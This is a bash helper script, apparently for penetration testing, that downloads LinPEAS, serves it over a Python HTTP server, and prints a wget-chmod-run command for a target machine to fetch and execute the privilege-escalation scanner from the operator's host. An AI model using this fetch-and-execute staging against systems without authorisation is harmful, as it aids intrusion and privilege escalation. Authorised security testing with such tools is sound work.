#!/bin/bash

# Function to get the local IP address of the debian based machine (Tested on Kali Linux)
get_local_ip() {
    ip addr show | grep -w inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1
}

# Variables
LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
LINPEAS_FILE="linpeas.sh"
LOCAL_IP=$(get_local_ip)
PORT=8080

# Step 1: Dl LinPEAS
echo "[+] Downloading LinPEAS..."
wget -q $LINPEAS_URL -O $LINPEAS_FILE
if [ $? -ne 0 ]; then
    echo "[-] Failed to download LinPEAS. Check your internet connection."
    exit 1
fi

echo "[+] LinPEAS downloaded successfully."

# Step 2: Host LinPEAS with a Python HTTP server
echo "[+] Starting Python HTTP server on port $PORT..."
python3 -m http.server $PORT &
HTTP_SERVER_PID=$!
sleep 2

if ! ps -p $HTTP_SERVER_PID > /dev/null; then
    echo "[-] Failed to start Python HTTP server."
    exit 1
fi

echo "[+] HTTP server running. Share the following command with the target machine:"
echo "wget http://$LOCAL_IP:$PORT/$LINPEAS_FILE && chmod +x $LINPEAS_FILE && ./$LINPEAS_FILE"

echo "[+] Press Ctrl+C to stop the HTTP server when the target has downloaded LinPEAS."

# Wait for user to terminate the server
trap "kill $HTTP_SERVER_PID; echo 'HTTP server stopped.'" INT
wait $HTTP_SERVER_PID
